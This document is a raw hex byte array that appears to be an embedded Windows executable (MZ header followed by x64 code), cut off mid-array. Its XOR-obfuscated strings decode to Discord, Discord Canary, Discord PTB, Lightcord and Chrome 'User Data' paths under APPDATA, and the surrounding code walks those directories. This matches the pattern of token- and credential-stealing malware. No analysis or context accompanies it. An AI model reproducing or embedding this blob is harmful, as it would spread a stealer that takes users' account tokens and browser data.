{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
0xff, 0xff, 0x49, 0x8b, 0xcc, 0xff, 0x15, 0x85, 0x5d, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0x70,
0x0c, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x58, 0x41, 0x0f, 0x28, 0x73, 0xf0, 0x41, 0x0f, 0x28, 0x7b,
0xe0, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3,
0x48, 0x85, 0xc9, 0x0f, 0x84, 0x55, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10,
0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41,
0x57, 0x48, 0x8d, 0xa8, 0x28, 0xf0, 0xff, 0xff, 0xb8, 0xb0, 0x10, 0x00, 0x00, 0xe8, 0x6e, 0x4b,
0x00, 0x00, 0x48, 0x2b, 0xe0, 0x0f, 0x29, 0xb4, 0x24, 0xa0, 0x10, 0x00, 0x00, 0x4d, 0x8b, 0xf9,
0x4d, 0x8b, 0xe0, 0x4c, 0x8b, 0xea, 0x48, 0x8b, 0xf1, 0x45, 0x33, 0xf6, 0xe8, 0x17, 0x49, 0xff,
0xff, 0x84, 0xc0, 0x0f, 0x84, 0xe0, 0x02, 0x00, 0x00, 0x8a, 0x16, 0x48, 0x8d, 0x85, 0x40, 0x06,
0x00, 0x00, 0x84, 0xd2, 0x74, 0x19, 0x48, 0x8d, 0xbd, 0x40, 0x06, 0x00, 0x00, 0x48, 0x8b, 0xce,
0x48, 0x2b, 0xcf, 0x88, 0x10, 0x48, 0xff, 0xc0, 0x8a, 0x14, 0x01, 0x84, 0xd2, 0x75, 0xf4, 0x44,
0x38, 0x35, 0x59, 0x5a, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xf3, 0x62, 0x00, 0x00, 0x66, 0x0f, 0x6f,
0x35, 0x0b, 0x50, 0x00, 0x00, 0x44, 0x88, 0x30, 0x75, 0x3d, 0xf3, 0x0f, 0x7f, 0x74, 0x24, 0x20,
0xc7, 0x44, 0x24, 0x30, 0x6f, 0x7c, 0x6f, 0x66, 0x49, 0x8b, 0xce, 0x66, 0xc7, 0x44, 0x24, 0x34,
0x6e, 0x68, 0x44, 0x88, 0x74, 0x24, 0x36, 0x8a, 0x44, 0x0c, 0x20, 0x34, 0x0a, 0x88, 0x04, 0x11,
0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x16, 0x72, 0xee, 0x44, 0x88, 0x35, 0xc6, 0x62, 0x00, 0x00,
0xc6, 0x05, 0x08, 0x5a, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x8d, 0x40, 0x06, 0x00, 0x00, 0xe8, 0xc9,
0x46, 0xff, 0xff, 0x4d, 0x8b, 0xcf, 0x48, 0x8d, 0x8d, 0x40, 0x06, 0x00, 0x00, 0x4d, 0x8b, 0xc4,
0x49, 0x8b, 0xd5, 0xe8, 0xd4, 0xf9, 0xff, 0xff, 0x8a, 0x0e, 0x48, 0x8d, 0x85, 0xf0, 0x0a, 0x00,
0x00, 0x84, 0xc9, 0x74, 0x19, 0x48, 0x8d, 0xbd, 0xf0, 0x0a, 0x00, 0x00, 0x48, 0x8b, 0xd6, 0x48,
0x2b, 0xd7, 0x88, 0x08, 0x48, 0xff, 0xc0, 0x8a, 0x0c, 0x02, 0x84, 0xc9, 0x75, 0xf4, 0x44, 0x38,
0x35, 0x76, 0x59, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xdc, 0x83, 0x00, 0x00, 0x44, 0x88, 0x30, 0x75,
0x36, 0x66, 0xc7, 0x85, 0xe0, 0x0f, 0x00, 0x00, 0x56, 0x20, 0x49, 0x8b, 0xce, 0x44, 0x88, 0xb5,
0xe2, 0x0f, 0x00, 0x00, 0x8a, 0x84, 0x0d, 0xe0, 0x0f, 0x00, 0x00, 0x34, 0x0a, 0x88, 0x04, 0x11,
0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x02, 0x72, 0xeb, 0x44, 0x88, 0x35, 0xaa, 0x83, 0x00, 0x00,
0xc6, 0x05, 0x34, 0x59, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x8d, 0xf0, 0x0a, 0x00, 0x00, 0xe8, 0x39,
0x46, 0xff, 0xff, 0x48, 0x8d, 0x8d, 0xf0, 0x0a, 0x00, 0x00, 0xe8, 0x81, 0x46, 0xff, 0xff, 0x48,
0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xae, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x8d, 0x7c,
0x24, 0x40, 0xb9, 0x50, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x40, 0xf3, 0xaa, 0x48, 0x8b,
0x3d, 0xab, 0x5b, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd7, 0x48, 0x8b, 0x3d, 0xbf, 0x59, 0x00,
0x00, 0x4c, 0x8b, 0xf0, 0x48, 0x85, 0xff, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00,
0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd7, 0x49, 0x83, 0xfe, 0xff, 0x0f, 0x84, 0x69, 0x01, 0x00, 0x00,
0x48, 0x8d, 0x3d, 0x89, 0x77, 0x00, 0x00, 0x33, 0xdb, 0xf6, 0x44, 0x24, 0x40, 0x10, 0x0f, 0x84,
0x36, 0x01, 0x00, 0x00, 0x66, 0x83, 0x7c, 0x24, 0x6c, 0x2e, 0x75, 0x1f, 0x0f, 0xb7, 0x44, 0x24,
0x6e, 0x66, 0x85, 0xc0, 0x0f, 0x84, 0x20, 0x01, 0x00, 0x00, 0x66, 0x83, 0xf8, 0x2e, 0x75, 0x0b,
0x66, 0x39, 0x5c, 0x24, 0x70, 0x0f, 0x84, 0x0f, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x6c,
0xe8, 0x97, 0x46, 0xff, 0xff, 0x4c, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xf9, 0x00, 0x00,
0x00, 0x8a, 0x16, 0x48, 0x8d, 0x8d, 0x90, 0x01, 0x00, 0x00, 0x84, 0xd2, 0x74, 0x20, 0x48, 0x8d,
0x85, 0x90, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xfe, 0x48, 0x2b, 0xf8, 0x88, 0x11, 0x48, 0xff, 0xc1,
0x8a, 0x14, 0x0f, 0x84, 0xd2, 0x75, 0xf4, 0x48, 0x8d, 0x3d, 0x12, 0x77, 0x00, 0x00, 0x38, 0x1d,
0x3d, 0x58, 0x00, 0x00, 0x88, 0x19, 0x75, 0x10, 0x66, 0xc7, 0x05, 0xdf, 0x60, 0x00, 0x00, 0x5c,
0x00, 0xc6, 0x05, 0x29, 0x58, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x15, 0xd1, 0x60, 0x00, 0x00, 0x48,
0x8d, 0x8d, 0x90, 0x01, 0x00, 0x00, 0xe8, 0x31, 0x45, 0xff, 0xff, 0x49, 0x8b, 0xd3, 0x48, 0x8d,
0x8d, 0x90, 0x01, 0x00, 0x00, 0xe8, 0x22, 0x45, 0xff, 0xff, 0x38, 0x1d, 0x39, 0x58, 0x00, 0x00,
0x75, 0x3b, 0xf3, 0x0f, 0x7f, 0x74, 0x24, 0x20, 0xc7, 0x44, 0x24, 0x30, 0x6f, 0x7c, 0x6f, 0x66,
0x48, 0x8b, 0xcb, 0x66, 0xc7, 0x44, 0x24, 0x34, 0x6e, 0x68, 0x88, 0x5c, 0x24, 0x36, 0x8a, 0x44,
0x0c, 0x20, 0x34, 0x0a, 0x88, 0x04, 0x39, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x16, 0x72, 0xee,
0x88, 0x1d, 0xb0, 0x76, 0x00, 0x00, 0xc6, 0x05, 0xfc, 0x57, 0x00, 0x00, 0x01, 0x48, 0x8b, 0xd7,
0x48, 0x8d, 0x8d, 0x90, 0x01, 0x00, 0x00, 0xe8, 0xd0, 0x44, 0xff, 0xff, 0x48, 0x8b, 0x05, 0x8d,
0x58, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00,
0x49, 0x8b, 0xcb, 0xff, 0xd0, 0x48, 0x8d, 0x8d, 0x90, 0x01, 0x00, 0x00, 0xe8, 0x67, 0x46, 0xff,
0xff, 0x84, 0xc0, 0x74, 0x15, 0x4d, 0x8b, 0xcf, 0x48, 0x8d, 0x8d, 0x90, 0x01, 0x00, 0x00, 0x4d,
0x8b, 0xc4, 0x49, 0x8b, 0xd5, 0xe8, 0xb2, 0xf7, 0xff, 0xff, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49,
0x8b, 0xce, 0xff, 0x15, 0x30, 0x5a, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xa9, 0xfe, 0xff, 0xff,
0x49, 0x8b, 0xce, 0xff, 0x15, 0x27, 0x5a, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x10, 0x00,
0x00, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x73, 0x40, 0x49, 0x8b, 0x7b, 0x48, 0x41, 0x0f, 0x28,
0x73, 0xf0, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc,
0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55,
0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xa8, 0x98, 0xeb, 0xff, 0xff, 0xb8,
0x40, 0x15, 0x00, 0x00, 0xe8, 0x17, 0x48, 0x00, 0x00, 0x48, 0x2b, 0xe0, 0xbb, 0x0a, 0x00, 0x00,
0x00, 0x0f, 0x29, 0xb4, 0x24, 0x30, 0x15, 0x00, 0x00, 0x33, 0xf6, 0x4c, 0x8d, 0x05, 0x46, 0x81,
0x00, 0x00, 0x40, 0x38, 0x35, 0x03, 0x5a, 0x00, 0x00, 0x48, 0x8b, 0xf9, 0x44, 0x8d, 0x73, 0xf7,
0x75, 0x3a, 0xc7, 0x85, 0x78, 0x14, 0x00, 0x00, 0x4b, 0x5a, 0x5a, 0x4e, 0x8b, 0xce, 0xc7, 0x85,
0x7c, 0x14, 0x00, 0x00, 0x4b, 0x5e, 0x4b, 0x00, 0x8a, 0x84, 0x0d, 0x78, 0x14, 0x00, 0x00, 0x32,
0xc3, 0x42, 0x88, 0x04, 0x01, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x07, 0x72, 0xea, 0x40, 0x88,
0x35, 0x0a, 0x81, 0x00, 0x00, 0x44, 0x88, 0x35, 0xc0, 0x59, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x30,
0x10, 0x00, 0x00, 0xe8, 0x7c, 0x75, 0xff, 0xff, 0x40, 0x38, 0x35, 0xb3, 0x56, 0x00, 0x00, 0x4c,
0x8d, 0x05, 0x22, 0x83, 0x00, 0x00, 0x75, 0x41, 0xc7, 0x44, 0x24, 0x20, 0x46, 0x45, 0x49, 0x4b,
0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x24, 0x46, 0x4b, 0x5a, 0x5a, 0xc7, 0x44, 0x24, 0x28, 0x4e,
0x4b, 0x5e, 0x4b, 0x40, 0x88, 0x74, 0x24, 0x2c, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x42, 0x88,
0x04, 0x01, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x0c, 0x72, 0xed, 0x40, 0x88, 0x35, 0xf2, 0x82,
0x00, 0x00, 0x44, 0x88, 0x35, 0x69, 0x56, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x30, 0x0c, 0x00, 0x00,
0xe8, 0x1f, 0x75, 0xff, 0xff, 0x40, 0x38, 0x35, 0x6e, 0x59, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x9d,
0x74, 0x00, 0x00, 0x75, 0x38, 0xc7, 0x44, 0x24, 0x20, 0x56, 0x6e, 0x63, 0x79, 0x48, 0x8b, 0xce,
0xc7, 0x44, 0x24, 0x24, 0x69, 0x65, 0x78, 0x6e, 0x40, 0x88, 0x74, 0x24, 0x28, 0x8a, 0x44, 0x0c,
0x20, 0x32, 0xc3, 0x88, 0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x08, 0x72, 0xee, 0x40,
0x88, 0x35, 0x72, 0x74, 0x00, 0x00, 0x44, 0x88, 0x35, 0x2d, 0x59, 0x00, 0x00, 0x40, 0x38, 0x35,
0x0d, 0x56, 0x00, 0x00, 0x48, 0x89, 0x54, 0x24, 0x58, 0x48, 0x8d, 0x15, 0xb8, 0x5a, 0x00, 0x00,
0x75, 0x47, 0xc7, 0x44, 0x24, 0x20, 0x56, 0x6e, 0x63, 0x79, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24,
0x24, 0x69, 0x65, 0x78, 0x6e, 0xc7, 0x44, 0x24, 0x28, 0x69, 0x6b, 0x64, 0x6b, 0x66, 0xc7, 0x44,
0x24, 0x2c, 0x78, 0x73, 0x40, 0x88, 0x74, 0x24, 0x2e, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88,
0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x0e, 0x72, 0xee, 0x40, 0x88, 0x35, 0x84, 0x5a,
0x00, 0x00, 0x44, 0x88, 0x35, 0xb8, 0x55, 0x00, 0x00, 0x40, 0x38, 0x35, 0x9f, 0x55, 0x00, 0x00,
0x48, 0x89, 0x54, 0x24, 0x60, 0x48, 0x8d, 0x15, 0x7c, 0x61, 0x00, 0x00, 0x75, 0x3b, 0xc7, 0x44,
0x24, 0x20, 0x56, 0x6e, 0x63, 0x79, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x24, 0x69, 0x65, 0x78,
0x6e, 0xc7, 0x44, 0x24, 0x28, 0x7a, 0x7e, 0x68, 0x00, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88,
0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x0b, 0x72, 0xee, 0x40, 0x88, 0x35, 0x51, 0x61,
0x00, 0x00, 0x44, 0x88, 0x35, 0x56, 0x55, 0x00, 0x00, 0x40, 0x38, 0x35, 0x65, 0x58, 0x00, 0x00,
0x48, 0x89, 0x54, 0x24, 0x68, 0x48, 0x8d, 0x15, 0x34, 0x77, 0x00, 0x00, 0x75, 0x39, 0x66, 0x0f,
0x6f, 0x05, 0x7a, 0x4b, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xf3, 0x0f, 0x7f, 0x44, 0x24, 0x20, 0xc7,
0x44, 0x24, 0x30, 0x6f, 0x64, 0x7e, 0x00, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88, 0x04, 0x11,
0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x13, 0x72, 0xee, 0x40, 0x88, 0x35, 0x13, 0x77, 0x00, 0x00,
0x44, 0x88, 0x35, 0x1e, 0x58, 0x00, 0x00, 0x40, 0x38, 0x35, 0x21, 0x55, 0x00, 0x00, 0x48, 0x89,
0x54, 0x24, 0x70, 0x48, 0x8d, 0x15, 0xfe, 0x76, 0x00, 0x00, 0x75, 0x3e, 0xc7, 0x44, 0x24, 0x20,
0x56, 0x46, 0x63, 0x6d, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x24, 0x62, 0x7e, 0x69, 0x65, 0x66,
0xc7, 0x44, 0x24, 0x28, 0x78, 0x6e, 0x40, 0x88, 0x74, 0x24, 0x2a, 0x8a, 0x44, 0x0c, 0x20, 0x32,
0xc3, 0x88, 0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x3b, 0xcb, 0x72, 0xef, 0x40, 0x88, 0x35, 0xcf,
0x76, 0x00, 0x00, 0x44, 0x88, 0x35, 0xd5, 0x54, 0x00, 0x00, 0x40, 0x38, 0x35, 0xc7, 0x57, 0x00,
0x00, 0x48, 0x89, 0x54, 0x24, 0x78, 0x48, 0x8d, 0x15, 0xa3, 0x66, 0x00, 0x00, 0x75, 0x40, 0x66,
0x0f, 0x6f, 0x05, 0xc9, 0x4d, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xf3, 0x0f, 0x7f, 0x44, 0x24, 0x20,
0xc7, 0x44, 0x24, 0x30, 0x55, 0x69, 0x65, 0x78, 0x66, 0xc7, 0x44, 0x24, 0x34, 0x6f, 0x00, 0x8a,
0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88, 0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x15, 0x72,
0xee, 0x40, 0x88, 0x35, 0x7d, 0x66, 0x00, 0x00, 0x44, 0x88, 0x35, 0x79, 0x57, 0x00, 0x00, 0x40,
0x38, 0x35, 0xe2, 0x57, 0x00, 0x00, 0x48, 0x89, 0x55, 0x80, 0x48, 0x8d, 0x15, 0x9f, 0x79, 0x00,
0x00, 0x75, 0x46, 0x66, 0x0f, 0x6f, 0x05, 0x85, 0x49, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xf3, 0x0f,
0x7f, 0x44, 0x24, 0x20, 0xc7, 0x44, 0x24, 0x30, 0x79, 0x6f, 0x78, 0x2a, 0xc7, 0x44, 0x24, 0x34,
0x4e, 0x6b, 0x7e, 0x6b, 0x40, 0x88, 0x74, 0x24, 0x38, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88,
0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x18, 0x72, 0xee, 0x40, 0x88, 0x35, 0x76, 0x79,
0x00, 0x00, 0x44, 0x88, 0x35, 0x8f, 0x57, 0x00, 0x00, 0x40, 0x38, 0x35, 0x2f, 0x54, 0x00, 0x00,
0x41, 0xba, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x55, 0x90, 0x48, 0x8d, 0x15, 0xb7, 0x61, 0x00,
0x00, 0x75, 0x53, 0xc7, 0x44, 0x24, 0x20, 0x69, 0x00, 0x62, 0x00, 0x48, 0x8b, 0xce, 0xc7, 0x44,
0x24, 0x24, 0x78, 0x00, 0x65, 0x00, 0xc7, 0x44, 0x24, 0x28, 0x67, 0x00, 0x6f, 0x00, 0xc7, 0x44,
0x24, 0x2c, 0x24, 0x00, 0x6f, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x72, 0x00, 0x6f, 0x00, 0x66, 0x89,
0x74, 0x24, 0x34, 0x0f, 0xb7, 0x44, 0x0c, 0x20, 0x66, 0x33, 0xc3, 0x66, 0x89, 0x04, 0x11, 0x49,
0x03, 0xca, 0x48, 0x83, 0xf9, 0x14, 0x72, 0xeb, 0x66, 0x89, 0x35, 0x7d, 0x61, 0x00, 0x00, 0x44,
0x88, 0x35, 0xc9, 0x53, 0x00, 0x00, 0x40, 0x38, 0x35, 0x2f, 0x57, 0x00, 0x00, 0x48, 0x89, 0x95,
0xd0, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x95, 0x7d, 0x00, 0x00, 0x75, 0x40, 0xc7, 0x85, 0x78,
0x14, 0x00, 0x00, 0x49, 0x62, 0x78, 0x65, 0x48, 0x8b, 0xce, 0x66, 0xc7, 0x85, 0x7c, 0x14, 0x00,
0x00, 0x67, 0x6f, 0x40, 0x88, 0xb5, 0x7e, 0x14, 0x00, 0x00, 0x8a, 0x84, 0x0d, 0x78, 0x14, 0x00,
0x00, 0x32, 0xc3, 0x88, 0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x06, 0x72, 0xeb, 0x40,
0x88, 0x35, 0x60, 0x7d, 0x00, 0x00, 0x44, 0x88, 0x35, 0xdf, 0x56, 0x00, 0x00, 0x40, 0x38, 0x35,
0x57, 0x56, 0x00, 0x00, 0x48, 0x89, 0x95, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xfe, 0x84,
0x00, 0x00, 0x75, 0x50, 0x66, 0x0f, 0x6f, 0x05, 0xf4, 0x46, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xf3,
0x0f, 0x7f, 0x44, 0x24, 0x20, 0xc7, 0x44, 0x24, 0x30, 0x6f, 0x7e, 0x6b, 0x56, 0xc7, 0x44, 0x24,
0x34, 0x5f, 0x79, 0x6f, 0x78, 0xc7, 0x44, 0x24, 0x38, 0x2a, 0x4e, 0x6b, 0x7e, 0x66, 0xc7, 0x44,
0x24, 0x3c, 0x6b, 0x00, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88, 0x04, 0x11, 0x49, 0x03, 0xce,
0x48, 0x83, 0xf9, 0x1d, 0x72, 0xee, 0x40, 0x88, 0x35, 0xd0, 0x84, 0x00, 0x00, 0x44, 0x88, 0x35,
0xf7, 0x55, 0x00, 0x00, 0x40, 0x38, 0x35, 0x01, 0x56, 0x00, 0x00, 0x48, 0x89, 0x55, 0x98, 0x48,
0x8d, 0x15, 0xaa, 0x81, 0x00, 0x00, 0x75, 0x53, 0xc7, 0x44, 0x24, 0x20, 0x69, 0x00, 0x62, 0x00,
0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x24, 0x78, 0x00, 0x65, 0x00, 0xc7, 0x44, 0x24, 0x28, 0x67,
0x00, 0x6f, 0x00, 0xc7, 0x44, 0x24, 0x2c, 0x24, 0x00, 0x6f, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x72,
0x00, 0x6f, 0x00, 0x66, 0x89, 0x74, 0x24, 0x34, 0x0f, 0xb7, 0x44, 0x0c, 0x20, 0x66, 0x33, 0xc3,
0x66, 0x89, 0x04, 0x11, 0x49, 0x03, 0xca, 0x48, 0x83, 0xf9, 0x14, 0x72, 0xeb, 0x66, 0x89, 0x35,
0x70, 0x81, 0x00, 0x00, 0x44, 0x88, 0x35, 0xa1, 0x55, 0x00, 0x00, 0x40, 0x38, 0x35, 0xed, 0x55,
0x00, 0x00, 0x48, 0x89, 0x95, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x5c, 0x83, 0x00, 0x00,
0x75, 0x40, 0xc7, 0x85, 0x78, 0x14, 0x00, 0x00, 0x49, 0x62, 0x78, 0x65, 0x48, 0x8b, 0xce, 0x66,
0xc7, 0x85, 0x7c, 0x14, 0x00, 0x00, 0x67, 0x6f, 0x40, 0x88, 0xb5, 0x7e, 0x14, 0x00, 0x00, 0x8a,
0x84, 0x0d, 0x78, 0x14, 0x00, 0x00, 0x32, 0xc3, 0x88, 0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83,
0xf9, 0x06, 0x72, 0xeb, 0x40, 0x88, 0x35, 0x27, 0x83, 0x00, 0x00, 0x44, 0x88, 0x35, 0x9d, 0x55,
0x00, 0x00, 0x40, 0x38, 0x35, 0xf2, 0x55, 0x00, 0x00, 0x48, 0x89, 0x95, 0x38, 0x01, 0x00, 0x00,
0x48, 0x8d, 0x15, 0xa1, 0x6b, 0x00, 0x00, 0x75, 0x4e, 0x66, 0x0f, 0x6f, 0x05, 0xff, 0x46, 0x00,
0x00, 0x48, 0x8b, 0xce, 0xf3, 0x0f, 0x7f, 0x44, 0x24, 0x20, 0xc7, 0x44, 0x24, 0x30, 0x72, 0x59,
0x56, 0x5f, 0xc7, 0x44, 0x24, 0x34, 0x79, 0x6f, 0x78, 0x2a, 0xc7, 0x44, 0x24, 0x38, 0x4e, 0x6b,
0x7e, 0x6b, 0x40, 0x88, 0x74, 0x24, 0x3c, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3, 0x88, 0x04, 0x11,
0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x1c, 0x72, 0xee, 0x40, 0x88, 0x35, 0x74, 0x6b, 0x00, 0x00,
0x44, 0x88, 0x35, 0x94, 0x55, 0x00, 0x00, 0x40, 0x38, 0x35, 0xf4, 0x51, 0x00, 0x00, 0x48, 0x89,
0x55, 0xa0, 0x48, 0x8d, 0x15, 0x37, 0x7a, 0x00, 0x00, 0x75, 0x53, 0xc7, 0x44, 0x24, 0x20, 0x69,
0x00, 0x62, 0x00, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x24, 0x78, 0x00, 0x65, 0x00, 0xc7, 0x44,
0x24, 0x28, 0x67, 0x00, 0x6f, 0x00, 0xc7, 0x44, 0x24, 0x2c, 0x24, 0x00, 0x6f, 0x00, 0xc7, 0x44,
0x24, 0x30, 0x72, 0x00, 0x6f, 0x00, 0x66, 0x89, 0x74, 0x24, 0x34, 0x0f, 0xb7, 0x44, 0x0c, 0x20,
0x66, 0x33, 0xc3, 0x66, 0x89, 0x04, 0x11, 0x49, 0x03, 0xca, 0x48, 0x83, 0xf9, 0x14, 0x72, 0xeb,
0x66, 0x89, 0x35, 0xfd, 0x79, 0x00, 0x00, 0x44, 0x88, 0x35, 0x94, 0x51, 0x00, 0x00, 0x40, 0x38,
0x35, 0xcb, 0x51, 0x00, 0x00, 0x48, 0x89, 0x95, 0xe0, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x3d,
0x81, 0x00, 0x00, 0x75, 0x40, 0xc7, 0x85, 0x78, 0x14, 0x00, 0x00, 0x49, 0x62, 0x78, 0x65, 0x48,
0x8b, 0xce, 0x66, 0xc7, 0x85, 0x7c, 0x14, 0x00, 0x00, 0x67, 0x6f, 0x40, 0x88, 0xb5, 0x7e, 0x14,
0x00, 0x00, 0x8a, 0x84, 0x0d, 0x78, 0x14, 0x00, 0x00, 0x32, 0xc3, 0x88, 0x04, 0x11, 0x49, 0x03,
0xce, 0x48, 0x83, 0xf9, 0x06, 0x72, 0xeb, 0x40, 0x88, 0x35, 0x08, 0x81, 0x00, 0x00, 0x44, 0x88,
0x35, 0x7b, 0x51, 0x00, 0x00, 0x40, 0x38, 0x35, 0x36, 0x54, 0x00, 0x00, 0x48, 0x89, 0x95, 0x40,
0x01, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x06, 0x7c, 0x00, 0x00, 0x75, 0x4e, 0x66, 0x0f, 0x6f, 0x05,
0x1c, 0x45, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xf3, 0x0f, 0x7f, 0x44, 0x24, 0x20, 0xc7, 0x44, 0x24,
0x30, 0x6f, 0x7c, 0x56, 0x5f, 0xc7, 0x44, 0x24, 0x34, 0x79, 0x6f, 0x78, 0x2a, 0xc7, 0x44, 0x24,
0x38, 0x4e, 0x6b, 0x7e, 0x6b, 0x40, 0x88, 0x74, 0x24, 0x3c, 0x8a, 0x44, 0x0c, 0x20, 0x32, 0xc3,
0x88, 0x04, 0x11, 0x49, 0x03, 0xce, 0x48, 0x83, 0xf9, 0x1c, 0x72, 0xee, 0x40, 0x88, 0x35, 0xd9,
0x7b, 0x00, 0x00, 0x44, 0x88, 0x35, 0xd8, 0x53, 0x00, 0x00, 0x40, 0x38, 0x35, 0x00, 0x51, 0x00,
